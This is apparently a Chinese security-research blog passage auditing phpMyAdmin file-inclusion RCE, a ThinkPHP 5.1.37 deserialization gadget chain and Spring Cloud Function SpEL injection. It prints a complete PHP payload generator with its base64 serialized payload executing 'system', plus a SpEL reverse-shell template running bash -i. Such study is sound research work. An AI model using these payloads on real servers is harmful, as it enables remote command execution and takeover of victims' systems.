![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1gP8NwwvrlWa1P3LkabN7UnSR64wtz6gz3KDcCLpVupJhK4RF5j5e9w/640?wx_fmt=jpeg)

        下面就是代审环节：

        入口点

        index.php 中用了 Config 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG10TxpupwGw8s3bWKxNlAHtibZ2ibXoSN4tQicI8ZmKP84cNEz6e98jz2Fg/640?wx_fmt=jpeg)

        Config.php 文件中使用了 require 包含了 common.inc.php 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG10TWr74FOBtPQ0X6sBRQZLyo7hULxc21wSH7gvZTTQ3XqhiaeJ22RlUw/640?wx_fmt=jpeg)

        在 lib/common.inc.php 中我们可以看到又包含了另一个目录的 common.inc.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1g9zhS0Zx1x4jnAmbdUr3iae43lrUWmDUe3KQmPibaTOFrL0Nm6r8mLRQ/640?wx_fmt=png)

        跟进去我们可以看到 453 行代码

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1iaf6UnCicbzRVUWHIicC8beQWN90x2NgYmWnGITz3NDIZQpF3SsFJSTzg/640?wx_fmt=jpeg)

        这里有一个 loadUserPreferences 函数，是用来加载用户数据库里面的内容，全局搜索找到该函数位置  

        第 972 行使用了 load 函数

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1zGXLqG3tsPrgSnZwTo3AIW4MumUrGyLjHt9hz8hS5JvRjVGtNFtTiaw/640?wx_fmt=jpeg)

        跟进来  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1wr3eZysLcSKE8RV3qe1UEtdbzsgmYTAGF1WUtIb36fSR8Y5rlgAxKQ/640?wx_fmt=jpeg)

        前面的入口流程就这么多，接下来就是核心分析，打上断点动态 debug 调试  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1rqJR7YBRGqJINBrQicTlwQoC4LR5HG9Ojw1ZnbKlZT6GCkjgEd9libfA/640?wx_fmt=png)

        我们可以看到第一行有 getRelationsParam，f7 跟进去，我们可以看到该函数是读取 sessions 的一些数据，如下  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1B3Z1icTMAK4ibOVM480PicviaPEicIN2kCXI9C2MT9lt8x4ibQv9ZCo9TsVw/640?wx_fmt=jpeg)

        然后 return 回来  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1JmP2xhCokIftNC2NicKnK3S9qgrx8dSXaVmZZsRjEbbGiaiathfGLemgw/640?wx_fmt=png)

        然后跟下来是 backquote 函数，f7 进去

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1yIZJjk9bBQiaFdf8lIib9f9tPIOa16GDjgfv1RjAnPN9LBZsw2iaYpFiaQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1yIZJjk9bBQiaFdf8lIib9f9tPIOa16GDjgfv1RjAnPN9LBZsw2iaYpFiaQ/640?wx_fmt=jpeg)

        进行拼接 test 和 pma__userconfig

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1LWjXoIPEvXwNOVNq20ibo2fOrvmsRsBgTnmnkqyrYFI3iauNrXkvHBUw/640?wx_fmt=png)

        然后就往下走到 88-92 进行拼接 sql 语句

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG103PLYA5K3IQOaDS6ubUhhbseLxp8ibp4ZCpqibN6kVbFpSwvIAfvDpSQ/640?wx_fmt=png)

        然后就是 93 行的 fetchSingleRow 函数，继续跟进来  

        这里的 config_data 获取到了路径

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1Wqfc7MANEvyHYckAFcZMVLq9vjVTbdy65d8ctt4NhxwX920yRWZmtQ/640?wx_fmt=png)

        return 回来  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG13yjKZulqBAlBRDt1GeHTBmu2kibMIibKW54Vz1WRwSexl57poEhJdPjA/640?wx_fmt=png)

        然后会对 config_data 表进行 json_decode 处理  

        这里会进入一个 readConfig 函数

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1TfmRrUOq02E7booylUFhB5rUExmzr7IB3jdJL49zY5tt0EiaIotOgng/640?wx_fmt=jpeg)

        然后跳过一些意义不大的函数

        到这里会给 prefs 一个赋值

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1iaWp6Jm4XzdrCbdWhU9AKrQRP8QJh8E0lPhEPv4ckx96SJURuVTqicZg/640?wx_fmt=jpeg)

        然后就是给 config_data 赋值  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1l7SHoGoTB6ibEVj01ickBBPVEju9UibCnoegGLhiaamTAWf2nxRHU5mOVQ/640?wx_fmt=png)

        路径就传过来了  

        953 行会 global 一个 cfg，并传过来 config_data

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1rcevFxuqPKySv2uCkLh3XwBulcztBP0bpbYp72WX4gN2uRgEKn8dmw/640?wx_fmt=png)

        这里就是我们的漏洞点了，如下  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1UcT3vaPZpVaeWkIte3iciadPdvs5udricm7SXHrolMuaPP702hUVea3jA/640?wx_fmt=png)

        我们跟进 Util 中的 getScriptNameForOption 函数，如下  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1ic1xXVzEfkV2BLicOyiaKIE06zLyAAFf28MbFibgniaJoEbN3zM0LhSlaNw/640?wx_fmt=png)

        Location 是 database 不是 server，于是跳过该条件判断，并且注意此时带过来的 target 是我们的 sessions 路径

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1Ot4EQf8eFcyFwK8qxXbzwS2oN51GRmBicqXSyamyCjZpTMR9eo59icIA/640?wx_fmt=png)

        此时可以看到 switch 中没有能跟路径匹配的  

        于是原路返回我们的 target

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1kibcLrPFhXydlUuFCnJReLWBKScWfEQrTS9fFxAYXuzCXIdbJlY9aNg/640?wx_fmt=png)

        进行包含

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1ia5MR2dShFPR9RZpLRz12iaEDP0posHlUvibHn9Zo6rAuOicb2NWiaVGicbA/640?wx_fmt=png)

        成功 RCE

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1oT4yq3EwdjwI3oyCYLsU8pjRDzMFWD8OjlWeiayial2nnx9evvnP8yXA/640?wx_fmt=jpeg)

10  

**10  
**

反序列化 RCE

        接着我们来分析难度较高的反序列化 + RCE，因为目前反序列化的文章并不是很多，所以这里先说一下基础概念

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIvjDTFkhuyCAtlibg00s7zRXegwibvaSDnze2ml2Sia2g2rHmhHEhhsslw/640?wx_fmt=png)

        先来看一下这段代码，基本的注释我已经在上面写好了，大家过一下就行，现在说一下几个点

1. 输出的变量 zactest 为什么变成了 zaczactest？

        这是因为定义 $zactest 的时候用的是 private 方法，我们看下面这段话

        private 是私有权限，他只能用在 zac 类中，但是在序列化后呢，为了表明这个是我独有的，他就必须要在定义的变量之前加上自己的类名

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIic0Ea60MqkF10X6J2R1ksPZiaGMNS1ic3iaBEicF8Um5hdzrC90kWBib8CPw/640?wx_fmt=png)

2.zaczactest 明明是 10 个字符，为什么显示 12 个？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI9kgsF7iaXDUuRqFX53OkcwSAmR2lpT4WAoHusALup3hicpoQ5YhAqskw/640?wx_fmt=png)

        这是因为私有化属性序列化的格式是 %00 类名 %00 属性名，类名就是 zac，属性名就是 zactest，在这当中分别插入两个 %00，所以就多出了两个字符，但为啥没显示出来呢？这是因为 %00 是空白符

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIiasKWR8kQ1LYiahNNoibyeBC8DUoTUSDKzY0p7ygIn4ia9sKwNXYEdlSng/640?wx_fmt=png)

3. 为什么 zac 变量前要加上一个 *，并且字符数是 6

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI9yLjMN1SVbk05nPticXeQCCKg0WibibKbXlzaDUic8ULnS7OBwJVAhZibnQ/640?wx_fmt=png)

        这个同理 2，因为是 protected 方法赋值的 $zac，所以它也有相应的格式，protected 格式为 %00*%00 属性名，这也是为什么 zac 变量前面要加上一个 *，并且字符数是 6 的原因了

4. 那除了这两个方法，public 有什么特性呢？

        前面俩兄弟都有相应的序列化格式，但是 public 没有，该是多少就是多少，他的特性就是 public 是公有化的，所以 public 赋值的变量可以在任何地方被访问

      然后就是实例复现，安装 thinkphp5.1.37，然后将 framework 改名为 thinkphp 放到, tp5.1.37 的目录里

https://github.com/top-think/framework/releases/tag/v5.1.37

https://github.com/top-think/think/releases/tag/v5.1.37

        因为我对反序列化也不是特别熟悉，所以以下基本完全参照该文章

https://www.cnblogs.com/xueweihan/p/11931096.html

        不过稍微修改了一些，比如过程中的一些方法，还有最后的动态审计部分，并且这篇文章中的 poc 我也是没复现成功，最后找到其他大佬发出来的 poc 复现成功的（如侵权私聊我）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI5cWFUMiaMfVrPfZVTXF9ibIdlPiaStgLlRTecKGRUemXyGDbxUVHyWkXw/640?wx_fmt=png)

        全局搜索_destruct

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIJV3g3SsSfYBeXl3UUuwJCXZgibg7ia0wB7awSibkBGBDzpvibpErrg8Adg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIAgEvH9F0TQPZ6ia9rfaILFKZcJrtnB3KtVWS2UvlT13yibkLmkyalvtA/640?wx_fmt=png)

        可以看到 desturct 有一个 removeFiles，跟进

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIG7FmhM0IxK9txexd9nZPZuFictZf1IPA8ZIX7m6TRWfWtibRGEvuAcNQ/640?wx_fmt=png)

        我们可以看到其中有一个 file_exists，那么当 filename 是一个对象的时候，就会调用 toString

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIdYlSDpVE4zTPawtAJYsFntoDvK1kpGAMnatqbM1EaJialiaicbE9WCY0w/640?wx_fmt=png)

        全局搜索 toString

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIYDficsoLiaE6rtrkH4hwOibBSwIKLGeNsPQdsUFIAqmzeCX0ZjCpovfsQ/640?wx_fmt=png)

        发现 toString 里面只有个 toJson，继续跟进

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIAHUDb55yiavBKmNkmKK7ic109LJFhMnnwNIRj3BibxOcYx82R0Qk7EgpQ/640?wx_fmt=png)

        发现有个 toArray，跟进去

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIO81T2XR5qBRAhyBmzCGQjTAKZ9gy6DgiaTK4nftUvWYnbZP1t6zGE2A/640?wx_fmt=png)

        往下翻，看到这几行代码，$this->append 的键名是 key，name 可控

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIia7FkrL1f0HF9S2fpGIAUbUIKuC5HG1ublXAeO7jkX6FddkKrvoVVEA/640?wx_fmt=png)

        那么 188 行的 realtion 呢？跟进 getRelation 试试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIaGYmUZ3kx35U2XN78BvhLhe9eueZ4DicALZseoQIEDQYebTVjUBxSYA/640?wx_fmt=png)

        我们可以看到在 toArray 函数中的第 201 行，判断! relation，那么想进来这个 if 里，就要让 $this->relation 返回空之类的，让 key 不在 $this->relation

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLINqT1rwnR4Hy9GA3YJC2stwNVLIdlfsyQjCMwfDSOu8UQKGXc9icAictA/640?wx_fmt=png)

        跟下去 getAttr

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLITic0jkWgZgg9afDXia8mGz5W4SMypjwTkNgFccYjaAmgYCng7Zg14lfw/640?wx_fmt=png)

        跟进 getData

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIbzFruPCntBHrUmMtEvDeTvXiaXb2RWsnwkrf2jHQia6ELQW54djoib4Ug/640?wx_fmt=png)

        我们只需要让 $this->data 中 有 $key 这个键，然后让 getAttr() 函数 486 行下面的 if 判断都没有，就可以直接使 $relation = $this->data[$key] ;

       那么 $this->data 可控，$key 也是可控的 ($this->append 中的 键名)，所以 $relation 也是可控的

        我们接着全局搜索__call

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIHmyCPiaTVj2OQXfNfB44rvvXicpiccPDic5LLicCyV8JuK3WkZsR7xo1KJw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI8zqPxicoJ02TMJErClN6LApwt3d4LKfCBYticO3SAGD8PJ3ZSsDBCb2A/640?wx_fmt=png)

        看到了 call_user_func_array，发现我们可以完全控制住第一个参数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLISELmYnicV7033oiaAicr35YhbwAicLOicLHCExbiaKlgsVfkrGTwg7Gp7wJg/640?wx_fmt=png)

        那么我们现在就需要找到这类函数，比如 input

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIMEC4R7qo9C6ZMXWD4icfWMrYTKb9RuoOCf6592aROaXjzXol1syy1Lw/640?wx_fmt=png)

        但这里我们只能去找间接调用 input 的方法，全局搜索 $this->input，找到 param 函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI0zk8HCic8ekMXk3lzA3W4HicibiaxjHLAhGZZ0te1mGVUeoU15PQ5BFPpQ/640?wx_fmt=png)

        我们在当前目录搜索哪里调用了 param 这个函数，看到了 isAjax

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIdLAtnoV31DcOaGvCb5M6jPtEFtXk35XUcrzqFBgve2HC6uh9RFPsYQ/640?wx_fmt=png)

        然后开始进行漏洞复现，首先在

        \application\index\controller\Index.php

        文件添加一个反序列化入口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIcZWC6OsZC5KJVBWrOs9y2jRmdOiaj6MCQQwIm7DwJVgMGQTibUXDcWvQ/640?wx_fmt=png)

        然后我们构建一个 payload

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI89VDpGIz3UhgT5Vx5Hzayz7fb75TWmF1YoLcia8sIuWtx5ozyeoo2KQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIzdBlficoLE9XpL4gwzR8mF2BfGiayFabUE6cnfibUXHqYRQw5FniaLL62A/640?wx_fmt=png)

```
<?php
namespace think;
abstract class Model{
protected $append = [];
private $data = [];
function __construct(){
$this->append = ["ethan"=>["dir","calc"]];
$this->data = ["ethan"=>new Request()];
}
}
class Request
{
protected $hook = [];
protected $filter = "system";
protected $config = [
// 表单请求类型伪装变量
'var_method'     => '_method',
// 表单ajax伪装变量
'var_ajax'       => '_ajax',
// 表单pjax伪装变量
'var_pjax'       => '_pjax',
// PATHINFO变量名 用于兼容模式
'var_pathinfo'   => 's',
// 兼容PATH_INFO获取
'pathinfo_fetch' => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
// 默认全局过滤方法 用逗号分隔多个
'default_filter' => '',
// 域名根，如thinkphp.cn
'url_domain_root'=> '',
// HTTPS代理标识
'https_agent_name'=> '',
// IP代理获取标识
'http_agent_ip'  => 'HTTP_X_REAL_IP',
// URL伪静态后缀
'url_html_suffix'=> 'html',
];
function __construct(){
$this->filter = "system";
$this->config = ["var_ajax"=>''];
$this->hook = ["visible"=>[$this,"isAjax"]];
}
}
namespace think\process\pipes;
use think\model\concern\Conversion;
use think\model\Pivot;

class Windows
{
private $files = [];
public function __construct()
{
$this->files=[new Pivot()];
}
}
namespace think\model;
use think\Model;
class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
/*input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami*/
?>
```

        然后 php 2.php 生成 payload，在 id 里加个 whoami

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIaOeEunJYNlj35mPG7p0Daib1gRHC9o7ibxEs4AXFEYg16jmHoZGlQKicA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIoabFV048DIxQAdYib4WF4M4XDHMYiawswA4uStPOExkRcfskfgvZRzOA/640?wx_fmt=png)

        成功拿下 rce

        因为这个反序列化网上教程都是静态硬审的，所以非常不好理解，为了便于理解，我们可以使用 xdebug 配合 phpstorm 进行动态调试，更好地理解参数传递的过程

        Php.ini 文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIF3OHLsdibJwLYxibFuuXwkiaDZYNhfgIP8agticLib3dKp7taQd7FynsoXg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI7OBd53g2tXBuLiaVO9Hr3MLWpucH2fAM39ezx7X7cD5kciahZEJpPDxg/640?wx_fmt=png)

        然后开启监听，burp 打上 payload 开始跟

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLID2FcNOaPLAzTd3TUsY5vPvnOymr5iba3btotY2rvX986VO6u5CnkicJA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIEyTj5mdY1o2c6PGXzqo4CzgfPOmsQ58fx6uSGHicHvnEaZRxgb2WzOg/640?wx_fmt=png)

        入口进来

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIyLxmsCOth82tdI2vmseEgRnlz3uxv3IpJk3nSqWfytL0R9SGKkTHdA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIHibiaHXPYfZvFFFY9HdrSL6QJr5XnsxpQ7n4nPJ1oQlcrOz2BUTeqdUQ/640?wx_fmt=png)

        然后 param 函数，获取到了一些方法之类的参数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIEnC2ibgKxXDbnrjUafCEricHAWluxowiatHEiciagF0yup5pQpxgpjyq7JQ/640?wx_fmt=png)

        跟到 input

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIoyc0CgZxqhmsrfic8nVL2gqaNf1lr3icREbaeT5xeDXOicicsZqSKR6cGQ/640?wx_fmt=png)

        getFilter

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIxpL16ZgTEaVkbw9jQmcJiccaLMyYJ3iaQzpYT6kITcaKtQKhzjzDAdFw/640?wx_fmt=png)

        反序列化入口点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIDHSqUZLa3elwAiav9YRibOLocLQKxCTdugFpcLnQmKtUV2MRGxgEKBdw/640?wx_fmt=png)

        调用__destruct

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIic2mYPqAHluKDbjD93h1PAxmgXXDkZeaHC96vbBJu8tkdsPcibn1QUuQ/640?wx_fmt=png)

        removeFiles

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIG50tviba066jyblh6JfHMenicSdib3G2ehBx8bXuetkqOPlCXBDCQH5eQ/640?wx_fmt=png)

        调用了 toString

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIqNgZyOjbTg4rtpe8cIxRIlfEIJ9Q9zpRHSVdd86cO47k9RpOQKbkRg/640?wx_fmt=png)

        然后跟进 tojson

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI6l1WvgEWJ1Fic6QvmvlPVOLDqpDQRrWnBgibnxtwUSWB6icTPmCuPJPHA/640?wx_fmt=png)

        继续跟进 toArray

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIZzicicOfMgZF26zIGGaicyBg7atvs5bWopC3NMRrMeLH24P44iaKqgm0gw/640?wx_fmt=png)

        然后就是 getAttr

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIWVjGCiaQJdGtf4R5VJPCs8UgsIyxkFkZhZpXXQ3TbLCUxFQPEv4vqvg/640?wx_fmt=png)

        getData

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLImQUpg4AribdwhjWC3fvjpaGiawT61zbVFFuian65BibnX53rDDnqoDOY2w/640?wx_fmt=png)

        getRelation

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIlqwricskDShkOC2L1jPznFZK6nl0AOHuIVYEHMMaZStRYicicduJHymSw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLISGkh9mvITHwItNiaBVwPSBOe9pKH83zVcDXDcvkYUl2PMOJyUpdiaArw/640?wx_fmt=png)

        然后跳过几个无用步骤，进到了 call

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI4NHx5fcia2PMuVEIjnmic76apjDRbage141fHc2O0pNhLhjWDlCGEFdQ/640?wx_fmt=png)

        isAjax

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIoKNCakKfGkQPpbUqvuUo2wCkm2VtkoicRfYFJf9l0OVUHelqofiakcOw/640?wx_fmt=png)

        然后再跳到 param

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIHQPiaq4OsXKCRVgN9kI8aQKftYfficThI6ZUQOj2eckI8euVxZgOJR8A/640?wx_fmt=png)

        然后再跳几下，就到了 appShutdown 结束

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIdCPkSeRzjl4uayqXMpuSiaNOhslfS2wrotgHnIrichqswFwy06YwDruA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIGgEsWaC4vgtt7cKQolBp7PysNAw7s0qelne0M8sAgKnA6xsLPQ48wA/640?wx_fmt=png)

        这就是一个大致的流程，理论还是按照静态审的来，也可以动态自己跟着走一遍可以理解（这里用的都是 f8，如果要跟的更加深入一点可以 f7 进入每个方法的模块一点点看，我这里跳步比较多，所以还是推荐自己去跟一下深入理解）

        Php 说了这么多，那么再来稍微说下 java，因为我 java 学的并不是很多，所以这里只是简单写几个案例，先来说一下 java 和 php 不同的地方，php 中的 exec，就相当于正常的 cmd 了，但是在 java 中却不一样，如下，单纯一个 whoami 可以正常执行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIykic8DbdEUaNcTcJOCI6PCdRXOdh0LkxSvcyicSyj32oSupH6OibNkVzA/640?wx_fmt=png)

        但是当我们用管道符拼接的时候发现，报错了，这是因为 Runtime.getRuntime().exec 将里面的参数当成一个完整的字符串了，而不是管道符分割的两个命令，那么也就不能像 php 一样进行拼接 rce 了，这也是体现 java 安全性高的一点（当然如果开发直接把参数代入了也是可以的，但是我没找到这样的 java 案例，这里有个坑点，记得加 exec.waitFor，不然执行不成功的，也可能单纯是我环境的问题）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIIrv7CwnGeLiapRdSLT9GoxX9P4RaibPbG217HKiaCwYmWn2Y6aO88ABag/640?wx_fmt=png)

        但是用 cmd /c 是可以的，不过如果开发写的是 ping 加参数依旧是不能直接拼接的，必须 command 全部参数都可控才行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLILNKGY3mnnXjZUqoBAY9XGVlpsrKSWjjcgtbRB33fM6otUibicQzlStdg/640?wx_fmt=png)

11  

**11**

表达式注入

        然后就是 java 的表达式注入，这里用最近的 Spring Cloud Function 的 spel 表达式注入做测试（因为好找靶场，本地环境一直搭不起来）（除了 spel 还有 OGNL,MVEL,EL 等，这里只用 spel 举例做测试）  
  
     先看一个简单的 demo，这里我们发现 12 行的 expression 代入到了 13 行的 parseExpression 中，可以解析 java.lang.Runtime 类，那么我们就可以直接执行命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLI71xicK7xHaZgupMqMVITuuXUtkCrXFjkjajkcxAfpXZ8icDnKib8dXhGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIMqPW7dAOR5B2dmDHia6VAibmmRE6xEGNsPzDye5VseiaNjib7OSuzichZlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIpDavYkarMbOvfdLF705QO7urh9w2aYuxLb0rkBF5unMPs2diaJGQO0w/640?wx_fmt=png)

        后面就是反弹 shell 了，网上文章较多，大家自行测试

T(java.lang.Runtime).getRuntime().exec("bash -c {echo,base64 加密的 shell}|{base64,-d}|{bash,-i}")

        原理分析，参考（https://www.t00ls.cc/thread-65356-1-1.html）

        这里获取 post，然后将参数转到 processRequest

